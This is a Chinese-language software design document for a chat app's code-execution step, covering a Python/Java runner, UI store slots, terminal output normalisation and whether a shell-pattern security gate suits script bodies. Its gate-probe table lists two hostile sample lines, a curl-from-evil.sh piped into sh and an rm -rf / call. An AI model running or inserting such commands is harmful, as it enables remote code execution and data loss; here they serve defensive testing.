# 代码执行 步骤 3 设计：runner + 前端接线

> 上游：`2026-08-11-code-exec-runner-v4-design.md`（v4 §11 落地顺序第 3 步）、
> `2026-08-11-run-registry-step2-design.md`（步骤 2，已完成并合入 master）。
>
> 本步是**第一次让用户在界面上看见东西**：点代码块的「运行」，Python / Java 真跑起来，
> 输出实时流到右栏。

---

## 0. 实测事实（本步设计的依据，全部有命令和输出）

> 本仓规矩：设计依据必须是实测结果，不是推断。凡本节以外的判断都标注为「未实测」。

### 0.1 安全闸喂脚本正文 = 误报 33%、漏报 100%

步骤 2 的 spec 写死了一条约束：

> 「片段档的『把代码块内容变成可跑的东西』属于 runner，落在步骤 3。
> 届时**必须把脚本正文也送进闸门**，这条约束现在就写下来，别到时候忘了。」

**按字面执行是错的。** 探针 `probe-step3-gate.mts`（11 个样本，`npx tsx` 真跑）：

```
[放]         py   最普通的脚本
[放]         py   f-string 带花括号
[拦] ← 判错 py   正则里有反斜杠和美元符      命中: obfuscated-flags / locale 引用 $"…" 可隐藏字符
[拦] ← 判错 py   字符串里有 $(...)          命中: command-substitution / $() 命令替换
[拦] ← 判错 py   反引号（Python 里是普通字符） 命中: command-substitution / 反引号命令替换
[放] ← 判错 py   真的调 shell 下载执行       os.system("curl -s http://evil.sh | sh")
[放] ← 判错 py   真的 rm -rf                subprocess.run("rm -rf /", shell=True)
[放]         java 最普通的类
[放]         java 字符串拼接带 $
[放]         html 普通页面
[放]         html 页面里 fetch 外部地址

无害代码被拦（误报）: 3/9
恶意代码被拦（正确）: 0/2
恶意代码被放（漏报）: 2
```

原因不需要猜：`hasBlockingBashSecurityIssue` 是按 **shell 语法**写的模式匹配
（`$(...)`、反引号、`$'…'`）。Python 正文里这些字符是普通字符，而 Python 真正危险的
东西（`os.system`、`subprocess(shell=True)`、`eval`、`__import__`）它一个都不认识。

**结论：闸门只对「最终执行的那条 shell 命令」有意义，对脚本正文没有意义。**
处理方式见 §5，那里是本设计最需要评审盯的一节。

### 0.2 Python：`uv run <孤立脚本>` 可直接跑

```
$ uv --version
uv 0.7.2 (481d05d8d 2025-04-30)
$ Test-Path e:\ai-study\zuse\pyproject.toml
False                                  ← 仓库根**没有** pyproject
$ uv run C:\Users\...\Temp\zuse-probe3\a.py     （cwd = 仓库根）
你好 from python
exit=0
$ uv run --no-project C:\Users\...\a.py
你好 from python
exit=0
```

两种写法都行。`--no-project` 更明确（不去向上找 `pyproject.toml`），但代价是
**脚本 import 不到用户项目里的依赖**。取舍见 §2.2。

### 0.3 Java：管道下 stdout 是 **OEM**，且 `-Dfile.encoding` 无效

本仓 `CLAUDE.md` 记着「中文输出要 `-Dfile.encoding=UTF-8`」——**这条对 JDK 21 的
stdout 是错的**。原始字节实测（`cmd /c java Hello.java > out.bin`，然后看字节）：

```
$ java Hello.java                                → out.bin: C4 E3 BA C3 20 66 ...
    按 UTF-8 解: ��� from java
    按 GBK  解: 你好 from java                   ← 管道下就是 GBK
$ java -Dfile.encoding=UTF-8 Hello.java          → 仍是 C4 E3 BA C3（无效）
$ java -Dstdout.encoding=UTF-8 -Dstderr.encoding=UTF-8 Hello.java
                                                 → E4 BD A0 E5 A5 BD（UTF-8，正确）
```

JDK 18+ 的 `file.encoding` 默认已是 UTF-8（JEP 400），所以设它是空操作；
控制台/管道的编码归 `stdout.encoding` / `stderr.encoding`（JDK 19+）管。

`JAVA_TOOL_OPTIONS` 也有效，但**会往 stderr 多打一行**
（`Picked up JAVA_TOOL_OPTIONS: …`，实测），所以用命令行 `-D` 而不是环境变量。

单文件源码直接执行（`java Hello.java`，JDK 11+ 特性）在本机 Temurin 21.0.9 上可用，
exit=0，不需要先 `javac`。

**注意**：即使不加这两个 `-D`，步骤 2 的首窗定码也能把 GBK 正确解出来（e2e ③b 验过）。
加 `-D` 是把「靠猜」变成「确定」，两条防线都要。

### 0.4 未实测、不下结论的

- `pytest` / `vite dev` 这类会不会输出 ANSI（v4 §8 只测了 11 条命令，ESC 全为 0）
- 非 Windows 平台的 `uv` / `java` 行为（本机只有 Windows）
- JDK 11–17 上 `stdout.encoding` 是否存在（该属性是 JDK 19+ 引入的，
  老版本上会被忽略，**不会报错**——但这句是推断，未实测）

---

## 1. 本步做什么 / 不做什么

**做：**
1. `runner`：代码块（Python / Java）→ 一条可执行的命令 + 一个临时脚本文件
2. store 拆双槽：`activePreview`（HTML 预览）+ `activeExec`（真跑），互不挤占
3. `RailExec` 组件 + 终端输出区（CRLF 归一化优先，ANSI 只 strip）
4. 前端接 `POST /api/runs` + `GET /api/runs/<id>/stream`（SSE）

**不做（留给步骤 4/5）：**
- 命令输入框、按命令同意、在飞运行列表（步骤 4）
- 把 run 暴露成模型工具（步骤 5）——**本步模型仍然看不到运行输出**，v4 §10 的显式取舍
- 除 Python / Java 外的语言

---

## 2. runner：代码块 → 可跑的东西

### 2.1 形状

```ts
export interface ExecPlan {
  /** 交给 run 服务的那条命令（已经拼好参数） */
  command: string
  /** 需要先落盘的临时文件；run 结束后删 */
  files: { path: string; content: string }[]
  /** 展示用：「用 uv 跑 Python」 */
  label: string
}
export function planExec(kind: ExecKind, code: string, tmpRoot: string): ExecPlan
```

纯函数（`tmpRoot` 注入），**不碰文件系统、不起进程**——落盘与清理归调用方。
这样它可测：给一段代码，断言拼出来的命令和文件内容，不需要真跑。

### 2.2 Python

```
文件: <tmp>/zuse-run-<id>/main.py
命令: uv run --no-project "<tmp>/zuse-run-<id>/main.py"
```

**用 `--no-project`。** 取舍：
- 好处：行为确定。不加的话 `uv` 会从 cwd 向上找 `pyproject.toml`，
  **同一段代码在不同项目里跑出不同结果**，而 cwd 是会话的活状态（`cd` 会改它）。
- 代价：脚本 **import 不到用户项目的依赖**。模型写 `import pandas` 会失败。
- 为什么仍然选它：本步是「跑模型写的片段」，不是「在项目里跑脚本」；
  后者是步骤 4 的命令输入框，那里 cwd 语义才是主角。
- **这条代价必须在 UI 上说人话**：失败时如果 stderr 含 `ModuleNotFoundError`，
  提示「这段代码用到了第三方库；本步只跑独立片段」。（不做自动装依赖——
  静默装包是比报错更坏的行为。）

### 2.3 Java

```
文件: <tmp>/zuse-run-<id>/Main.java        ← 文件名必须匹配 public class
命令: java -Dstdout.encoding=UTF-8 -Dstderr.encoding=UTF-8 "<...>/Main.java"
```

**文件名要从代码里解析出 public class 名**，否则 `java Foo.java` 报
`class X is public, should be declared in a file named X.java`。
解析不出来（没有 public class）就退化成 `Main.java`。

### 2.4 临时文件放哪、谁来删

- 放 `os.tmpdir()` 下的一次性目录，**不放用户项目里**（跑一次代码不该在人家仓库里留垃圾）
- **cwd 仍然是会话 cwd**——脚本里 `open("data.csv")` 读的是用户项目里的文件，符合直觉
- 删除时机：run 收到 `end` 事件之后。**故意不在进程退出前删**——
  Windows 上文件被占用时删除会失败
- 删除失败**不上报给用户**（tmp 里的垃圾不是用户的问题），但要 `console.warn`

---

## 3. store 双槽（v4 §7）

现状（实测读过原文）：`activePreview.ts` 只有 `let activeRun: ActiveRun | null` 一个槽，
`Rail.tsx:85` 是 `{run ? <RailRun run={run}/> : null}`。

单槽 + 判别联合 = **预览与执行互斥**：跑着的 Python 会被「打开一个 HTML 预览」挤掉。

**做法**：拆成两个模块级槽，各自独立的 `open/close/use`：

```
activePreview  → RailRun   （HTML/JS/Vue 预览，iframe）
activeExec     → RailExec  （Python/Java 真跑，终端）
```

`Rail.tsx` 里是**两个固定槽位**，都用 `{x ? <C/> : null}` 的写法。
（`railSlot.test.tsx` 已经用最小复现证明过：静态 JSX 子节点按槽位对齐，
条件子节点不论真假都占一格，**不会**让后面的兄弟重挂。这条别再写错。）

**切会话要同时清两个槽**——`activePreview` 那个坑（右栏挂着上一个会话的内容）
在新槽上会原样复发。

---

## 4. 终端输出区（v4 §8）

### 4.1 CRLF 必须先归一化

v4 §8 实测：`mvn -v` 有 5 个 CR、`tsc -v` 有 1 个。
把 `\r` 一律当「回到行首覆盖本行」处理，**Windows 上会把每一行都吃掉**。

顺序写死：**先 `\r\n` → `\n`，再处理裸 `\r`**。

### 4.2 ANSI 只做 strip

v4 §8 实测 11 条真实命令 ESC 字节全为 0（非 TTY 时工具链默认关色）。
所以一条 strip 正则够用。代价：设了 `FORCE_COLOR` 的用户看到无色输出。

### 4.3 增量渲染，不是每次重排全文

SSE 推的是增量 chunk。**不要每来一块就把全文重新 split + 归一化**——
输出上万行时那是 O(n²)。做法：维护「已归一化的尾巴」，只处理新来的部分。
边界情况：`\r\n` 跨 chunk 分裂（前一块结尾 `\r`，后一块开头 `\n`），
必须把悬挂的 `\r` 留到下一块再判——**这条要有测试**。

---

## 5. 安全闸怎么办（本设计最需要评审的一节）

§0.1 实测证明：把脚本正文送进 bash 闸门 = 误报 33% + 漏报 100%。
所以「按字面实现步骤 2 那条约束」被排除。剩下的候选：

| | 做法 | 好处 | 代价 |
|---|---|---|---|
| **A** | 正文完全不过闸，只对最终 shell 命令过闸（现状） | 无误报 | 恶意 Python 一路放行，等于没防 |
| **B** | 给脚本语言写专门的模式（`os.system`/`subprocess`/`eval`/`Runtime.exec`…） | 能挡住明显的 | 极易变成安全剧场：`getattr(os,'sys'+'tem')` 就绕过；且会新增误报 |
| **C** | 不做内容检测，改成**首次运行时一次明确确认**（「这会在你的电脑上真的执行这段代码」），带「本会话内不再问」 | 诚实：把判断权交给看得懂代码的人 | 多一次点击；用户可能习惯性点「同意」 |
| **D** | C + B 的弱化版：确认框里**顺带显示**检测到的可疑点，但不阻断 | 既不误伤也给信息 | 实现量最大 |

**倾向 C（并把 D 作为后续增强）**，理由：
- 本步执行的是**用户自己点击的、屏幕上就摆着的代码**，不是模型背着用户跑的东西。
  真正的知情人是用户，不是正则。
- B 的漏报是结构性的（动态语言拦不住字符串拼接），做了会给人「有防护」的错觉，
  比明确说「这会真的执行」更危险。
- v4 §5 已经确立过一次同样的判断：安全闸的价值在**把理由显示给人看**，
  而不是静默拦截。

**同意的粒度**：`hash(cwd + '\0' + 代码正文)`，存会话内存层。
换一段代码要重新确认——代码是逐字执行的，改一个字就是另一段程序。
**不写进 `permissions.allow`**（那是持久化的，一次点击换永久放行太重）。

**已知代价（写下来，不留白）**：模型每次微调代码都要重新确认。
缓解手段留给步骤 4（那里同意键的设计要一起想）。

---

## 6. 明确的取舍

1. **模型看不到运行输出**（v4 §10）。用户点运行 → 报错 → 得手工把 traceback
   贴回聊天框。步骤 5 才解决。**不写这条，读者会以为模型能自己迭代。**
2. **Python 片段跑不了第三方库**（§2.2 的 `--no-project`）。
3. **只有 Python / Java**。Node/TS 片段本来就能在 iframe 里预览，优先级更低。
4. **本步没有「在飞运行列表」**，所以关掉右栏 = 断连 = 片段档把进程收掉
   （步骤 2 刚修好的 `onDetach:'kill'`，实测 0.58s 生效）。想保留要等步骤 4。

---

## 7. 测试要点

- `planExec` 纯函数：Python/Java 各自的命令与文件名（Java 要测 public class 解析）
- CRLF：`a\r\nb` → 两行；`a\rb`（裸 CR）→ 覆盖；**`\r` 与 `\n` 跨 chunk 分裂**
- ANSI strip：带色输出去色后行数不变
- store 双槽：开一个 exec 不会关掉正开着的 preview（**反过来也要测**）
- 切会话：两个槽都被清
- 同意：同一段代码第二次不再问；**改一个字符就重新问**
- 临时文件：run 结束后被删；删失败不抛
- **变异验证**：把 CRLF 归一化的顺序调换（先处理裸 `\r`）→ 对应测试必须变红
- **真浏览器点一遍**（本仓铁律：测试绿 ≠ 能用）：点运行 → 看到输出流出来 →
  点停止 → 进程真的停

---

## 8. 落地顺序

1. `planExec` + 测试（纯函数，最先，无依赖）
2. 终端文本处理（CRLF/ANSI/增量）+ 测试
3. store 双槽 + `Rail.tsx` 接线 + 测试
4. `RailExec` 组件 + SSE 订阅
5. 确认框（§5 的 C 方案）
6. rebuild + 重启 daemon + **真浏览器验证**
7. 合本地 master + 写 `docs/features.md`
